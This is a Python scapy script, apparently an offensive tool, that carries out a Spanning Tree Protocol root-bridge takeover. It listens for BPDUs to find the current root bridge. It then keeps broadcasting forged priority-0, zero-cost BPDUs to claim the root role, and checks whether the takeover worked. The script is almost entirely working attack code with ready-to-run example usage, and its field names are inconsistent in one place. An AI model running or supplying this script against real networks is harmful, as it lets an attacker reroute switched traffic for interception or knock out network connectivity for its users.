#!/usr/bin/env python3
from scapy.all import *
import threading
import time

class AdvancedSTPAttack:
    def __init__(self, interface, target_priority=0):
        self.interface = interface
        self.target_priority = target_priority
        self.own_mac = get_if_hwaddr(interface)
        self.original_root = None
        self.attack_active = False
        
    def discover_current_topology(self):
        """Phase 1: Discover current STP topology"""
        print("[+] Discovering current STP topology...")
        
        def bpdu_handler(packet):
            if packet.haslayer(STP):
                stp_data = {
                    'root_bridge_id': packet[STP].rootid,
                    'bridge_id': packet[STP].bridgeid,
                    'root_path_cost': packet[STP].pathcost,
                    'port_id': packet[STP].portid,
                    'sender_mac': packet[Ether].src
                }
                
                if not self.original_root:
                    self.original_root = stp_data
                    print(f"[+] Current Root Bridge: {hex(stp_data['root_bridge_id'])}")
                    print(f"[+] Root Path Cost: {stp_data['root_path_cost']}")
        
        # Listen for BPDUs to understand topology
        sniff(iface=self.interface, prn=bpdu_handler, 
              filter="ether dst 01:80:c2:00:00:00", timeout=60, stop_filter=lambda x: self.original_root)
    
    def craft_superior_bpdu(self):
        """Create superior BPDU to become root bridge"""
        # Convert MAC to integer for Bridge ID
        mac_int = int(self.own_mac.replace(':', ''), 16)
        superior_bridge_id = (self.target_priority << 48) | mac_int
        
        superior_bpdu = (
            Dot3(dst="01:80:c2:00:00:00", src=self.own_mac) /
            LLC(dsap=0x42, ssap=0x42, ctrl=3) /
            STP(
                proto=0x0000,           # STP Protocol ID
                version=0x00,           # STP Version
                bpdutype=0x00,          # Configuration BPDU
                flags=0x00,             # No Topology Change
                rootid=superior_bridge_id,  # Claim to be root
                rootpathcost=0x00000000,    # Zero cost (we are root)
                bridgeid=superior_bridge_id, # Our Bridge ID
                portid=0x8001,          # Port ID (priority 128, port 1)
                age=0x0000,             # Message Age
                maxage=0x1400,          # Max Age (20 seconds)
                hello=0x0200,           # Hello Time (2 seconds)
                fwddelay=0x0f00         # Forward Delay (15 seconds)
            )
        )
        
        return superior_bpdu
    
    def execute_root_takeover(self):
        """Execute root bridge takeover attack"""
        print(f"[+] Attempting to become root bridge with priority {self.target_priority}")
        
        superior_bpdu = self.craft_superior_bpdu()
        self.attack_active = True
        
        # Send superior BPDUs continuously
        while self.attack_active:
            sendp(superior_bpdu, iface=self.interface, verbose=0)
            time.sleep(2)  # Send every 2 seconds (hello time)
    
    def monitor_attack_success(self):
        """Monitor if attack was successful"""
        print("[+] Monitoring attack effectiveness...")
        
        def success_handler(packet):
            if packet.haslayer(STP):
                current_root = packet[STP].rootid
                mac_int = int(self.own_mac.replace(':', ''), 16)
                our_bridge_id = (self.target_priority << 48) | mac_int
                
                if current_root == our_bridge_id:
                    print("[+] SUCCESS: We are now the root bridge!")
                    return True
        
        sniff(iface=self.interface, prn=success_handler,
              filter="ether dst 01:80:c2:00:00:00", timeout=120)

# Example usage
stp_attack = AdvancedSTPAttack("eth0", target_priority=0)
stp_attack.discover_current_topology()
threading.Thread(target=stp_attack.execute_root_takeover, daemon=True).start()
stp_attack.monitor_attack_success()
